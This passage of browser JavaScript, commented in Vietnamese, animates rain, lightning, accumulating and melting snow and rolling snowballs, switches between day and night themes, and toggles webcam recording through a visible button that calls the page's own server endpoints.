    const rc = document.getElementById('rainContainer');
    if(rc) rc.style.display = 'block';
    
    createRain();
    triggerLightning();

    // 3. Nếu đang có tuyết dưới đất -> Kích hoạt chế độ rửa trôi (Tan nhanh)
    if (snowLevel > 0) {
        startMelting(true); // true = isRain (Tan nhanh)
    }

    // Hẹn giờ tạnh
    setTimeout(stopRain, CFG.rainDuration);
}

function stopRain() {
    console.log("🌤️ Tạnh mưa.");
    currentWeather = WEATHER.CLEAR;
    
    document.body.classList.remove('storm-active');
    document.getElementById('rainContainer').style.display = 'none';
    if(lightningTimer) clearTimeout(lightningTimer);
    
    // Nếu tạnh mưa mà trời đang sáng -> Chuyển sang chế độ tan chậm (Nắng)
    // Nếu tạnh mưa mà trời tối -> Ngừng tan
    if (!document.body.classList.contains('dark-mode')) {
        startMelting(false); // Tan chậm
    } else {
        if(meltingTimer) clearInterval(meltingTimer);
    }

    scheduleNextWeather();
}

// --- BẮT ĐẦU TUYẾT ---
function startSnow() {
    // Chỉ tuyết khi trời quang (Không Mưa)
    if (currentWeather !== WEATHER.CLEAR) return;
    if (giftTimer) { clearTimeout(giftTimer); giftTimer = null; }


    console.log("❄️ TUYẾT RƠI!");
    currentWeather = WEATHER.SNOW;
    
    // 1. Dừng chế độ tan tuyết (nếu đang tan)
    if (meltingTimer) clearInterval(meltingTimer);

    // 2. Hiệu ứng tuyết rơi
    createSnow();

    // 3. Tích tụ tuyết (Đợi 2s để tuyết rơi xuống đất rồi mới phủ)
    setTimeout(() => {
        if (snowAccumulateTimer) clearInterval(snowAccumulateTimer);
        snowAccumulateTimer = setInterval(() => {
            // Nếu bỗng dưng mưa -> Dừng tích tụ ngay
            if (currentWeather !== WEATHER.SNOW) {
                clearInterval(snowAccumulateTimer);
                return;
            }

            if (snowLevel < 100) {
                snowLevel += 1; // Tăng dần
                updateSnowVisuals();
            } else {
                stopSnow(); // Phủ kín thì dừng rơi
            }
        }, CFG.snowSpeed);
    }, 2000);
}

function stopSnow() {
    console.log("🛑 Tuyết ngừng rơi.");
    currentWeather = WEATHER.CLEAR;
    document.getElementById('snowContainer').style.display = 'none';
    if (snowAccumulateTimer) clearInterval(snowAccumulateTimer);

    // Logic sau khi tuyết ngừng:
    // Nếu là Đêm -> Giữ nguyên tuyết.
    // Nếu là Ngày -> Bắt đầu tan.
    if (!document.body.classList.contains('dark-mode')) {
        startMelting(false); // Tan chậm
    }
    
    scheduleNextWeather();
}

// --- LOGIC CỤC TUYẾT LĂN ---
function startSnowballEffect() {
    if (nightTimer) return; 

    function spawnSnowball() {
        // ĐIỀU KIỆN DỪNG MỚI: 
        // Nếu tuyết tan còn mỏng (dưới 30%) thì ngừng tạo cục mới
        if (snowLevel < 30) {
            nightTimer = null;
            return;
        }

        const container = document.getElementById('sceneNight');
        if (!container) return;

        // (Đoạn code tạo div rolling-wrapper giữ nguyên như cũ)
        const wrapper = document.createElement('div');
        wrapper.classList.add('rolling-wrapper');
        const inner = document.createElement('div');
        inner.classList.add('rolling-inner');
        
        const speed = Math.random() * 4 + 6 + 's';
        wrapper.style.animationDuration = speed;
        inner.style.animationDuration = speed;

        wrapper.appendChild(inner);
        container.appendChild(wrapper);

        setTimeout(() => wrapper.remove(), 10000); 

        const nextTime = Math.random() * 4000 + 4000;
        nightTimer = setTimeout(spawnSnowball, nextTime);
    }
    
    spawnSnowball();
}

// --- LOGIC ĐỔI MÀU (Cập nhật cho nút Theme) ---
window.toggleTheme = function() {
    const body = document.body;
    const btn = document.querySelector('.theme-toggle');
    
    if (body.classList.contains('light-mode')) {
        // Chuyển sang TỐI (Đêm)
        body.classList.remove('light-mode'); body.classList.add('dark-mode');
        if(btn) btn.innerText = "☀️ Chế độ Ngày";
        
        // Đêm thì ngừng tan tuyết (trừ khi đang Mưa)
        if (currentWeather !== WEATHER.RAIN) {
            if(meltingTimer) clearInterval(meltingTimer);
        }
    } else {
        // Chuyển sang SÁNG (Ngày)
        body.classList.remove('dark-mode'); body.classList.add('light-mode');
        if(btn) btn.innerText = "🌙 Chế độ Đêm";
        
        // Ngày thì tuyết bắt đầu tan (nếu đang có tuyết & không mưa)
        if (snowLevel > 0 && currentWeather !== WEATHER.RAIN) {
            startMelting(false); // Tan chậm
        }
    }
};

// --- ĐIỀU PHỐI CHÍNH ---
function scheduleNextWeather() {
    setTimeout(() => {
        const choice = Math.random();
        if (choice > 0.5) startRain(); else startSnow();
    }, CFG.breakTime);
}


// --- LOGIC GHI HÌNH WEBCAM (MỚI) ---
function toggleWebcamRecord() {
    const btn = document.getElementById('btnRecordWebcam');
    const frame = document.getElementById('webcamFrame');

    if (!isWebcamRecording) {
        // --- BẮT ĐẦU GHI ---
        // (Bỏ confirm nếu muốn bấm là quay luôn)
        // if(!confirm("Bắt đầu ghi hình Webcam?")) return; 

        // Chỉ cần thêm class, CSS sẽ tự đổi icon và màu sắc
        btn.classList.add('recording'); 
        frame.classList.add('recording'); // Hiện chữ REC góc trái
        isWebcamRecording = true;

        fetch('/api/webcam/record/start')
            .then(r => { if(!r.ok) stopUI(); })
            .catch(e => { stopUI(); });

    } else {
        // --- DỪNG GHI ---
        stopUI();
        fetch('/api/webcam/record/stop')
            .then(r => r.text())
            .then(msg => {
                 // Có thể hiện thông báo nhỏ thay vì alert để đỡ phiền
                 console.log("Đã lưu video.");
            });
    }

    function stopUI() {
        // Gỡ class, nút tự về trạng thái ban đầu
        btn.classList.remove('recording');
        frame.classList.remove('recording');
        isWebcamRecording = false;
    }
}





// Bắt đầu chu trình sau 5 giây
setTimeout(scheduleNextWeather, 5000);